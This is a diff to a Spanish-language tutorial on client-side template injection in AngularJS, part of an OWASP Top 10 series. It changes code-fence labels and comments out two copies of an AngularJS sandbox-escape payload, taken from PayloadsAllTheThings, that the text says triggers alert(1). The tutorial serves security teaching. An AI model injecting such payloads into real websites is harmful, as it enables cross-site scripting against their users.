@@ -50,7 +50,8 @@ En este caso se puede utilizar el repositorio de PayloadAllTheThings, en este ca
 
 En este caso, el payload que se utilizará es el siguiente:
 
-```bash
+```javascript
+/*
 {{
     c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
     c.$apply=$apply;c.$eval=b;op=$root.$$phase;
@@ -65,6 +66,7 @@ En este caso, el payload que se utilizará es el siguiente:
     m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
     $eval('a(b.c)');[].push.apply=a;
 }}
+*/
 ```
 
 Este payload, está haciendo un “alert(1) de forma que cuando esto se ingrese en la web, mostrará una alerta con valor 1”:
@@ -89,7 +91,8 @@ Luego estos caracteres de pueden tratar para representarlos en una misma línea:
 
 Ahora esto se puede incluir en el payload
 
-```bash
+```javascript
+/*
 {{
     c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
     c.$apply=$apply;c.$eval=b;op=$root.$$phase;
@@ -104,6 +107,7 @@ Ahora esto se puede incluir en el payload
     m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
     $eval('a(b.c)');[].push.apply=a;
 }}
+*/
 ```
 
 ![Untitled](../assets/OWASP-TOP-10/Client-Side Template Injection CSTI/Untitled 7.png)
